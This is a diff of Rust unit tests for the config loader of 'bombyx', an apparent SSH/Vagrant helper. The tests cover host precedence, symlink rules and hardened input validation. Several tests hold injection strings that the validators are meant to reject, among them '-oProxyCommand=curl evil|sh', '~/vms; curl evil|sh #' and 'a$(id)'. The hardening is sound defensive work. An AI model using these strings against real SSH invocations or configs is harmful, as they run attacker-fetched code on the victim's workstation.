         let cfg = good().with_overlay(toml::from_str(src).unwrap());
-        assert_eq!(cfg.host, "h");
         assert_eq!(cfg.project, "p");
         assert_eq!(cfg.vagrant_dir, "vm");
         assert_eq!(cfg.remote_root, "/srv/v");
@@ -770,8 +1305,439 @@ mod tests {
         let base = dir.path().join("bombyx.toml");
         std::fs::write(&base, minimal()).unwrap();
         std::fs::write(dir.path().join("bombyx.local.toml"), overlay).unwrap();
-        let loaded = Config::load(&base);
+        // A per-developer file supplies the host, which is the
+        // ordinary arrangement: the project file cannot carry
+        // one. It is the lowest-precedence source, so an overlay
+        // naming `host` still overrides it.
+        write_user_file(dir.path(), "vmhost");
+        let loaded = load(&base, &user_sources(dir.path()));
         (dir, loaded)
+    }
+
+    /// [`Config::load`] without the origin.
+    ///
+    /// Most tests are about the resulting config; the ones about
+    /// provenance call `Config::load` directly and assert on the
+    /// [`HostOrigin`] it returns.
+    fn load(path: &Path, sources: &HostSources) -> Result<Config, ConfigError> {
+        Config::load(path, sources).map(|(cfg, _origin)| cfg)
+    }
+
+    /// Writes a per-developer config naming `host`.
+    fn write_user_file(dir: &Path, host: &str) {
+        std::fs::write(
+            dir.join(USER_CONFIG_FILE),
+            format!("host = {host:?}\n"),
+        )
+        .unwrap();
+    }
+
+    /// Sources whose only entry is the per-developer directory.
+    fn user_sources(dir: &Path) -> HostSources<'_> {
+        HostSources {
+            user_config_dir: Some(dir),
+            ..HostSources::default()
+        }
+    }
+
+    /// Sources naming a host on the command line.
+    fn flag_sources(host: &str) -> HostSources<'_> {
+        HostSources {
+            flag: Some(host),
+            ..HostSources::default()
+        }
+    }
+
+    /// Writes the minimal project file into a fresh directory.
+    fn project_dir(source: &str) -> (tempfile::TempDir, PathBuf) {
+        let dir = tempfile::tempdir().unwrap();
+        let base = dir.path().join("bombyx.toml");
+        std::fs::write(&base, source).unwrap();
+        (dir, base)
+    }
+
+    #[test]
+    fn rejects_a_host_key_in_the_project_file() {
+        // The design rule, asserted: the VM host belongs to the
+        // developer, and this file is committed. Refused rather
+        // than ignored, so a stale key cannot sit in a repo
+        // aiming everyone's `destroy` at one person's machine.
+        let (_dir, base) = project_dir("host = \"vmhost\"\nproject = \"p\"\n");
+        let err = load(&base, &HostSources::default()).unwrap_err();
+        assert!(matches!(err, ConfigError::HostInProjectFile { .. }));
+        let text = err.to_string();
+        // The message has to say where the line goes instead,
+        // or it only reports a problem.
+        assert!(text.contains("bombyx.local.toml"), "{text}");
+        assert!(text.contains("committed"), "{text}");
+    }
+
+    #[test]
+    fn a_host_key_is_refused_even_when_a_flag_supplies_one() {
+        // Tempting to let the flag win and move on. It must not:
+        // the committed key is the thing being removed, and a
+        // run that succeeds is a run nobody fixes.
+        let (_dir, base) = project_dir("host = \"vmhost\"\nproject = \"p\"\n");
+        assert!(matches!(
+            load(&base, &flag_sources("mine")).unwrap_err(),
+            ConfigError::HostInProjectFile { .. }
+        ));
+    }
+
+    #[test]
+    fn reports_no_host_configured_when_nothing_supplies_one() {
+        let (_dir, base) = project_dir(minimal());
+        let err = load(&base, &HostSources::default()).unwrap_err();
+        assert!(matches!(err, ConfigError::HostMissing { .. }));
+        // Every way out is named, since the operator has to pick
+        // one and the files are not discoverable by guessing.
+        let text = err.to_string();
+        assert!(text.contains("bombyx.local.toml"), "{text}");
+        assert!(text.contains("--host"), "{text}");
+        assert!(text.contains(HOST_ENV), "{text}");
+    }
+
+    #[test]
+    fn takes_the_host_from_the_user_config_file() {
+        let (dir, base) = project_dir(minimal());
+        write_user_file(dir.path(), "my-vmhost");
+        let sources = user_sources(dir.path());
+        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
+    }
+
+    #[test]
+    fn host_precedence_runs_flag_env_overlay_user_file() {
+        // All four sources present at once, then removed one at
+        // a time. Testing each in isolation would pass with any
+        // ordering at all.
+        let (dir, base) = project_dir(minimal());
+        std::fs::write(
+            dir.path().join("bombyx.local.toml"),
+            "host = \"from-overlay\"\n",
+        )
+        .unwrap();
+        write_user_file(dir.path(), "from-user-file");
+
+        let all = HostSources {
+            flag: Some("from-flag"),
+            env: Some("from-env"),
+            ..user_sources(dir.path())
+        };
+        assert_eq!(load(&base, &all).unwrap().host, "from-flag");
+
+        let no_flag = HostSources { flag: None, ..all };
+        assert_eq!(load(&base, &no_flag).unwrap().host, "from-env");
+
+        let no_env = HostSources {
+            env: None,
+            ..no_flag
+        };
+        assert_eq!(load(&base, &no_env).unwrap().host, "from-overlay");
+
+        std::fs::remove_file(dir.path().join("bombyx.local.toml")).unwrap();
+        assert_eq!(load(&base, &no_env).unwrap().host, "from-user-file");
+    }
+
+    #[test]
+    fn load_reports_which_source_won() {
+        // The origin is what lets a caller *say* which host is in
+        // force without re-deriving the ranking. Asserted for
+        // every source, since a constant would satisfy any one of
+        // them.
+        let (dir, base) = project_dir(minimal());
+        std::fs::write(
+            dir.path().join("bombyx.local.toml"),
+            "host = \"from-overlay\"\n",
+        )
+        .unwrap();
+        write_user_file(dir.path(), "from-user-file");
+
+        let origin_of =
+            |sources: &HostSources| Config::load(&base, sources).unwrap().1;
+
+        let user = user_sources(dir.path());
+        assert_eq!(origin_of(&user), HostOrigin::Overlay);
+
+        let env = HostSources {
+            env: Some("from-env"),
+            ..user
+        };
+        assert_eq!(origin_of(&env), HostOrigin::Env);
+
+        let flag = HostSources {
+            flag: Some("from-flag"),
+            ..env
+        };
+        assert_eq!(origin_of(&flag), HostOrigin::Flag);
+
+        std::fs::remove_file(dir.path().join("bombyx.local.toml")).unwrap();
+        assert_eq!(origin_of(&user), HostOrigin::UserFile);
+    }
+
+    #[test]
+    fn an_overlay_host_is_taken_rather_than_left_in_place() {
+        // `with_overlay` ignores `host`, and this is what makes
+        // that safe rather than merely intended: by the time the
+        // overlay is merged the field is empty, so no later change
+        // to the merge can resurrect a value that two other
+        // sources outrank.
+        let mut overlay = Overlay {
+            host: Some("from-overlay".to_owned()),
+            ..Overlay::default()
+        };
+        let sources = HostSources::default();
+        let (host, origin) =
+            resolve_host(&sources, Some(&mut overlay), None).unwrap();
+        assert_eq!(host, "from-overlay");
+        assert_eq!(origin, HostOrigin::Overlay);
+        assert_eq!(overlay.host, None);
+    }
+
+    #[test]
+    fn an_invalid_host_names_the_source_that_supplied_it() {
+        // Reported as a plain field error, the only path in the
+        // message was the project file's -- the one file that must
+        // not carry a host, so it sent the operator to edit the
+        // wrong thing.
+        let (dir, base) = project_dir(minimal());
+        write_user_file(dir.path(), "-oProxyCommand=x");
+        let err = load(&base, &user_sources(dir.path())).unwrap_err();
+        let text = err.to_string();
+        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{text}");
+        assert!(text.contains(USER_CONFIG_FILE), "{text}");
+        assert!(!text.contains("bombyx.toml"), "{text}");
+
+        // And the flag names itself rather than a file.
+        let err = load(&base, &flag_sources("-oProxyCommand=x")).unwrap_err();
+        assert!(err.to_string().contains("--host"), "{err}");
+    }
+
+    #[test]
+    fn a_symlinked_user_config_is_followed() {
+        // The symlink refusal exists because a *repo* can commit
+        // one beside the project file. Nothing in a clone can
+        // touch the operator's own config directory, and every
+        // ordinary dotfile manager (stow, chezmoi, a hand-made
+        // `ln -s`) symlinks exactly this file -- which made bombyx
+        // fail on every subcommand with a message that never
+        // mentioned symlinks.
+        let (dir, base) = project_dir(minimal());
+        let real = dir.path().join("real-config.toml");
+        std::fs::write(&real, "host = \"linked-host\"\n").unwrap();
+
+        let link = dir.path().join(USER_CONFIG_FILE);
+        if !symlink_file(&real, &link) {
+            // Windows needs a privilege for this; the guarantee is
+            // asserted wherever the test can create a link.
+            return;
+        }
+
+        assert_eq!(
+            load(&base, &user_sources(dir.path())).unwrap().host,
+            "linked-host"
+        );
+    }
+
+    #[test]
+    fn a_symlinked_project_config_is_still_refused() {
+        // The other half of the same rule, and the reason it
+        // exists: pointed at a private key, the TOML parse error
+        // would echo a line of it to stderr.
+        let dir = tempfile::tempdir().unwrap();
+        let real = dir.path().join("real.toml");
+        std::fs::write(&real, minimal()).unwrap();
+        let link = dir.path().join("bombyx.toml");
+        if !symlink_file(&real, &link) {
+            return;
+        }
+        assert!(matches!(
+            load(&link, &flag_sources("vmhost")).unwrap_err(),
+            ConfigError::NotAFile(_)
+        ));
+    }
+
+    /// Creates a file symlink, or `false` where not permitted.
+    fn symlink_file(target: &Path, link: &Path) -> bool {
+        #[cfg(windows)]
+        let result = std::os::windows::fs::symlink_file(target, link);
+        #[cfg(not(windows))]
+        let result = std::os::unix::fs::symlink(target, link);
+        result.is_ok()
+    }
+
+    #[test]
+    fn an_empty_host_env_var_counts_as_unset() {
+        // An exported-but-empty variable is how a shell says "no
+        // value". Taking it literally would report an empty-field
+        // error naming a file the operator never edited.
+        let (dir, base) = project_dir(minimal());
+        write_user_file(dir.path(), "my-vmhost");
+        let sources = HostSources {
+            env: Some("  "),
+            ..user_sources(dir.path())
+        };
+        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
+    }
+
+    #[test]
+    fn a_broken_user_config_is_not_read_when_a_flag_wins() {
+        // `--host` has to work on a machine whose per-developer
+        // file is missing, unreadable or malformed -- that is
+        // half the point of having a flag.
+        let (dir, base) = project_dir(minimal());
+        std::fs::write(dir.path().join(USER_CONFIG_FILE), "host = ").unwrap();
+        let sources = HostSources {
+            flag: Some("mine"),
+            user_config_dir: Some(dir.path()),
+            env: None,
+        };
+        assert_eq!(load(&base, &sources).unwrap().host, "mine");
+    }
+
+    #[test]
+    fn a_user_config_rejects_an_unknown_key() {
+        // Same rule as the overlay: a typo in a file nobody
+        // reads twice must be an error, not a setting that does
+        // nothing.
+        let (dir, base) = project_dir(minimal());
+        std::fs::write(dir.path().join(USER_CONFIG_FILE), "hsot = \"x\"\n")
+            .unwrap();
+        let sources = HostSources {
+            user_config_dir: Some(dir.path()),
+            ..HostSources::default()
+        };
+        let err = load(&base, &sources).unwrap_err();
+        assert!(matches!(err, ConfigError::Parse { .. }));
+        assert!(err.to_string().contains(USER_CONFIG_FILE));
+    }
+
+    #[test]
+    fn a_user_config_without_a_host_is_not_a_host() {
+        // The file exists and parses but names nothing, which
+        // must read the same as no file at all.
+        let (dir, base) = project_dir(minimal());
+        std::fs::write(dir.path().join(USER_CONFIG_FILE), "\n").unwrap();
+        let sources = HostSources {
+            user_config_dir: Some(dir.path()),
+            ..HostSources::default()
+        };
+        assert!(matches!(
+            load(&base, &sources).unwrap_err(),
+            ConfigError::HostMissing { .. }
+        ));
+    }
+
+    #[test]
+    fn a_host_from_the_environment_is_still_validated() {
+        // The charset check used to guard a repo-supplied value.
+        // It now guards the argv instead: every remaining source
+        // reaches `ssh` as its first argument, and a mistake can
+        // fill any of them in. The file sources are covered by
+        // `an_invalid_host_names_the_source_that_supplied_it`;
+        // this is the environment, which no file check reaches.
+        let (dir, base) = project_dir(minimal());
+        let sources = HostSources {
+            env: Some("-oProxyCommand=x"),
+            ..user_sources(dir.path())
+        };
+        let err = load(&base, &sources).unwrap_err();
+        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{err}");
+        assert!(err.to_string().contains(HOST_ENV), "{err}");
+    }
+
+    /// [`config_dir_from`] against a fixed environment.
+    fn config_dir(vars: &[(&str, &str)], windows: bool) -> Option<PathBuf> {
+        let owned: Vec<(String, String)> = vars
+            .iter()
+            .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
+            .collect();
+        config_dir_from(
+            move |key| {
+                owned.iter().find(|(k, _)| k == key).map(|(_, v)| v.clone())
+            },
+            windows,
+        )
+    }
+
+    #[test]
+    fn user_config_dir_prefers_its_env_var_then_the_platform_ones() {
+        // The override first, then the platform's own variable.
+        assert_eq!(
+            config_dir(
+                &[
+                    (CONFIG_DIR_ENV, "/over"),
+                    ("APPDATA", "/app"),
+                    ("HOME", "/home/i"),
+                ],
+                true
+            ),
+            Some(PathBuf::from("/over"))
+        );
+        assert_eq!(
+            config_dir(
+                &[("XDG_CONFIG_HOME", "/xdg"), ("HOME", "/home/i")],
+                false
+            ),
+            Some(Path::new("/xdg").join("bombyx"))
+        );
+        assert_eq!(
+            config_dir(&[("HOME", "/home/i")], false),
+            Some(Path::new("/home/i").join(".config").join("bombyx"))
+        );
+        // Nothing usable in the environment: bombyx cannot guess,
+        // and a relative guess would read a host out of the repo.
+        assert_eq!(config_dir(&[], false), None);
+        assert_eq!(config_dir(&[("APPDATA", "/app")], false), None);
+    }
+
+    #[test]
+    fn appdata_is_consulted_only_on_windows() {
+        // Documented as the Windows location, and it was checked
+        // on every platform. `APPDATA` is routinely exported in
+        // processes that are not Windows -- under WSL via
+        // `WSLENV`, under Wine, in some CI images -- where it beat
+        // `$HOME/.config` and made bombyx read a host out of a
+        // file the docs said applied only to Windows.
+        let vars = [("APPDATA", "/app"), ("HOME", "/home/i")];
+        assert_eq!(
+            config_dir(&vars, true),
+            Some(Path::new("/app").join("bombyx"))
+        );
+        assert_eq!(
+            config_dir(&vars, false),
+            Some(Path::new("/home/i").join(".config").join("bombyx"))
+        );
+        // On Windows the home fallback is *not* used: a machine
+        // with no APPDATA is one bombyx should not guess about.
+        assert_eq!(config_dir(&[("HOME", "/home/i")], true), None);
+    }
+
+    #[test]
+    fn a_config_dir_that_is_not_anchored_counts_as_unset() {
+        // The whole family, not just the blank case that prompted
+        // the guard. Each of these resolves against the working
+        // directory -- which for this tool means taking the VM
+        // host out of whatever repo bombyx was run in, the one
+        // thing this design removes. `..` walks out of the tree,
+        // and `C:cfg` is drive-*relative*: it resolves against
+        // that drive's current directory.
+        for bad in [
+            "", "  ", ".", "..", "cfg", "cfg/", "./cfg", "C:cfg", "~/cfg",
+        ] {
+            assert_eq!(
+                config_dir(&[(CONFIG_DIR_ENV, bad), ("HOME", "/h")], false),
+                Some(Path::new("/h").join(".config").join("bombyx")),
+                "{bad:?} must be ignored"
+            );
+        }
+        // And the anchored spellings that must still work.
+        for good in ["/srv/cfg", "\\\\srv\\cfg", "C:/cfg", "d:\\cfg"] {
+            assert_eq!(
+                config_dir(&[(CONFIG_DIR_ENV, good)], false),
+                Some(PathBuf::from(good)),
+                "{good:?} must be accepted"
+            );
+        }
     }
 
     #[test]
@@ -788,14 +1754,13 @@ mod tests {
     fn an_overlay_cannot_smuggle_an_ssh_option() {
         // `host` reaches `ssh` as its first positional
         // argument, and neither ssh nor scp honours `--`, so a
-        // leading `-` is read as an option. Validating before
-        // merging would make the overlay the one way into the
-        // config that skips that check.
+        // leading `-` is read as an option. The overlay must not
+        // be the one source that skips that check.
         let (_dir, loaded) = load_with_overlay("host = \"-oProxyCommand=x\"");
-        assert!(matches!(
-            loaded.unwrap_err(),
-            ConfigError::Invalid { field: "host", .. }
-        ));
+        let err = loaded.unwrap_err();
+        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{err}");
+        // And the message names the file holding the value.
+        assert!(err.to_string().contains("bombyx.local.toml"), "{err}");
     }
 
     #[test]
@@ -838,7 +1803,7 @@ mod tests {
         std::fs::create_dir(dir.path().join("bombyx.local.toml")).unwrap();
 
         assert!(matches!(
-            Config::load(&base).unwrap_err(),
+            load(&base, &flag_sources("vmhost")).unwrap_err(),
             ConfigError::NotAFile(_)
         ));
     }
@@ -854,7 +1819,7 @@ mod tests {
         std::fs::write(&base, "#".repeat(over)).unwrap();
 
         assert!(matches!(
-            Config::load(&base).unwrap_err(),
+            load(&base, &flag_sources("vmhost")).unwrap_err(),
             ConfigError::TooLarge(_)
         ));
     }
@@ -870,20 +1835,20 @@ mod tests {
 
     #[test]
     fn accepts_a_user_at_host_destination() {
-        let src = "host = \"igor@frosti.local\"\nproject = \"p\"\n";
-        assert_eq!(parse(src).unwrap().host, "igor@frosti.local");
+        let host = "igor@vmhost.local";
+        assert_eq!(parse_with_host(host).unwrap().host, host);
     }
 
     #[test]
     fn rejects_invalid_toml() {
-        let err = parse("host = ").unwrap_err();
+        let err = parse("project = ").unwrap_err();
         assert!(matches!(err, ConfigError::Parse { .. }));
         assert!(err.to_string().contains("bombyx.toml"));
     }
 
     #[test]
     fn rejects_missing_required_field() {
-        let err = parse("host = \"frosti\"\n").unwrap_err();
+        let err = parse("vagrant_dir = \"vm\"\n").unwrap_err();
         assert!(matches!(err, ConfigError::Parse { .. }));
     }
 
@@ -892,7 +1857,7 @@ mod tests {
         // A typo must be reported, not silently defaulted:
         // the symptom would otherwise be a push into the
         // wrong remote directory.
-        let src = "host = \"f\"\nproject = \"p\"\n\
+        let src = "project = \"p\"\n\
                    vagrantdir = \"infra/vm\"\n";
         let err = parse(src).unwrap_err();
         assert!(matches!(err, ConfigError::Parse { .. }));
@@ -901,21 +1866,22 @@ mod tests {
 
     #[test]
     fn rejects_empty_host() {
-        let src = "host = \"\"\nproject = \"phren\"\n";
-        let err = parse(src).unwrap_err();
+        // `--host ""` was typed, so it is reported as an empty
+        // field rather than treated as unset.
+        let err = parse_with_host("").unwrap_err();
         assert!(matches!(err, ConfigError::Empty { field: "host" }));
     }
 
     #[test]
     fn rejects_whitespace_only_project() {
-        let src = "host = \"frosti\"\nproject = \"  \"\n";
+        let src = "project = \"  \"\n";
         let err = parse(src).unwrap_err();
         assert!(matches!(err, ConfigError::Empty { field: "project" }));
     }
 
     #[test]
     fn rejects_empty_vagrant_dir() {
-        let src = "host = \"f\"\nproject = \"p\"\nvagrant_dir = \"\"\n";
+        let src = "project = \"p\"\nvagrant_dir = \"\"\n";
         let err = parse(src).unwrap_err();
         assert!(matches!(
             err,
@@ -927,7 +1893,7 @@ mod tests {
 
     #[test]
     fn rejects_empty_remote_root() {
-        let src = "host = \"f\"\nproject = \"p\"\nremote_root = \"\"\n";
+        let src = "project = \"p\"\nremote_root = \"\"\n";
         let err = parse(src).unwrap_err();
         assert!(matches!(
             err,
@@ -941,9 +1907,7 @@ mod tests {
     fn rejects_a_host_that_is_an_ssh_option() {
         // The headline case: a cloned repo must not be able
         // to run code on this workstation.
-        let src = "host = \"-oProxyCommand=curl evil|sh\"\n\
-                   project = \"p\"\n";
-        let err = parse(src).unwrap_err();
+        let err = parse_with_host("-oProxyCommand=curl evil|sh").unwrap_err();
         assert!(matches!(err, ConfigError::Invalid { field: "host", .. }));
         assert!(err.to_string().contains("option"));
     }
@@ -951,14 +1915,16 @@ mod tests {
     #[test]
     fn rejects_a_host_with_shell_metacharacters() {
         for host in ["a;id", "a$(id)", "a b", "a`id`", "a/b"] {
-            let src = format!("host = {host:?}\nproject = \"p\"\n");
-            assert!(parse(&src).is_err(), "host {host:?} must be rejected");
+            assert!(
+                parse_with_host(host).is_err(),
+                "host {host:?} must be rejected"
+            );
         }
     }
 
     #[test]
     fn rejects_a_remote_root_with_shell_metacharacters() {
-        let src = "host = \"f\"\nproject = \"p\"\n\
+        let src = "project = \"p\"\n\
                    remote_root = \"~/vms; curl evil|sh #\"\n";
         let err = parse(src).unwrap_err();
         assert!(matches!(
@@ -972,8 +1938,7 @@ mod tests {
 
     /// Asserts `remote_root` is refused as an invalid field.
     fn assert_root_rejected(root: &str) {
-        let src =
-            format!("host = \"f\"\nproject = \"p\"\nremote_root = {root:?}\n");
+        let src = format!("project = \"p\"\nremote_root = {root:?}\n");
         let err = parse(&src).unwrap_err();
         assert!(
             matches!(
@@ -1032,16 +1997,14 @@ mod tests {
         // The dotted name is the important one: the check is per
         // segment, not a substring search.
         for root in ["~/vms", "~/vms.d", "/srv/vms", "/srv/vms/deep", "~/v/"] {
-            let src = format!(
-                "host = \"f\"\nproject = \"p\"\nremote_root = {root:?}\n"
-            );
+            let src = format!("project = \"p\"\nremote_root = {root:?}\n");
             assert!(parse(&src).is_ok(), "remote_root {root:?} must parse");
         }
     }
 
     #[test]
     fn path_segments_measures_depth_not_characters() {
-        assert_eq!(path_segments("~/vms/phren"), vec!["vms", "phren"]);
+        assert_eq!(path_segments("~/vms/myproject"), vec!["vms", "myproject"]);
         assert_eq!(path_segments("//x//y"), vec!["x", "y"]);
         assert_eq!(path_segments("~"), Vec::<&str>::new());
         // `.` is kept, so a caller can reject it.
@@ -1050,7 +2013,7 @@ mod tests {
 
     #[test]
     fn rejects_a_non_leading_tilde_in_remote_root() {
-        let src = "host = \"f\"\nproject = \"p\"\n\
+        let src = "project = \"p\"\n\
                    remote_root = \"/srv/~igor\"\n";
         let err = parse(src).unwrap_err();
         assert!(err.to_string().contains("first character"));
@@ -1058,7 +2021,7 @@ mod tests {
 
     #[test]
     fn rejects_a_project_that_is_not_one_segment() {
-        let src = "host = \"f\"\nproject = \"../../etc\"\n";
+        let src = "project = \"../../etc\"\n";
         let err = parse(src).unwrap_err();
         assert!(matches!(
             err,
@@ -1071,7 +2034,7 @@ mod tests {
 
     #[test]
     fn rejects_a_vagrant_dir_that_looks_like_a_flag() {
-        let src = "host = \"f\"\nproject = \"p\"\n\
+        let src = "project = \"p\"\n\
                    vagrant_dir = \"--exclude=x\"\n";
         let err = parse(src).unwrap_err();
         assert!(matches!(
@@ -1085,7 +2048,7 @@ mod tests {
 
     #[test]
     fn rejects_a_vagrant_dir_with_control_characters() {
-        let src = "host = \"f\"\nproject = \"p\"\n\
+        let src = "project = \"p\"\n\
                    vagrant_dir = \"a\\nb\"\n";
         let err = parse(src).unwrap_err();
         assert!(err.to_string().contains("control characters"));
@@ -1093,19 +2056,19 @@ mod tests {
 
     #[test]
     fn accepts_a_windows_vagrant_dir() {
-        let src = "host = \"f\"\nproject = \"p\"\n\
+        let src = "project = \"p\"\n\
                    vagrant_dir = 'infra\\vm'\n";
         assert_eq!(parse(src).unwrap().vagrant_dir, r"infra\vm");
     }
 
     #[test]
     fn builds_remote_project_dir() {
-        assert_eq!(good().remote_project_dir(), "~/vms/phren");
+        assert_eq!(good().remote_project_dir(), "~/vms/myproject");
     }
 
     #[test]
     fn remote_project_dir_ignores_trailing_slash() {
-        let src = "host = \"f\"\nproject = \"p\"\nremote_root = \"/srv/\"\n";
+        let src = "project = \"p\"\nremote_root = \"/srv/\"\n";
         assert_eq!(parse(src).unwrap().remote_project_dir(), "/srv/p");
     }
 
@@ -1116,14 +2079,14 @@ mod tests {
         // boot overwrites the first's `.vagrant/`.
         assert_eq!(
             good().remote_scratch_dir(&scratch("pr-1234")),
-            "~/vms/scratch/phren/pr-1234"
+            "~/vms/scratch/myproject/pr-1234"
         );
     }
 
     #[test]
     fn scratch_dirs_of_two_projects_do_not_collide() {
         let a = good();
-        let src = "host = \"frosti\"\nproject = \"ledgerstone\"\n";
+        let src = "project = \"ledgerstone\"\n";
         let b = parse(src).unwrap();
         let name = scratch("pr-1");
         assert_ne!(a.remote_scratch_dir(&name), b.remote_scratch_dir(&name));
@@ -1132,7 +2095,7 @@ mod tests {
     #[test]
     fn load_reports_missing_file() {
         let path = Path::new("definitely-not-here-bombyx.toml");
-        let err = Config::load(path).unwrap_err();
+        let err = load(path, &flag_sources("vmhost")).unwrap_err();
         assert!(matches!(err, ConfigError::NotFound(_)));
         assert!(err.to_string().contains("config file not found"));
     }
@@ -1142,7 +2105,8 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join("bombyx.toml");
         std::fs::write(&path, minimal()).unwrap();
-        assert_eq!(Config::load(&path).unwrap().project, "phren");
+        let cfg = load(&path, &flag_sources("vmhost")).unwrap();
+        assert_eq!(cfg.project, "myproject");
     }
 
     #[test]
@@ -1154,7 +2118,7 @@ mod tests {
         // being read now answers this case first, and says what
         // is actually wrong.
         let dir = tempfile::tempdir().unwrap();
-        let err = Config::load(dir.path()).unwrap_err();
+        let err = load(dir.path(), &flag_sources("vmhost")).unwrap_err();
         assert!(matches!(err, ConfigError::NotAFile(_)), "{err:?}");
     }
 }
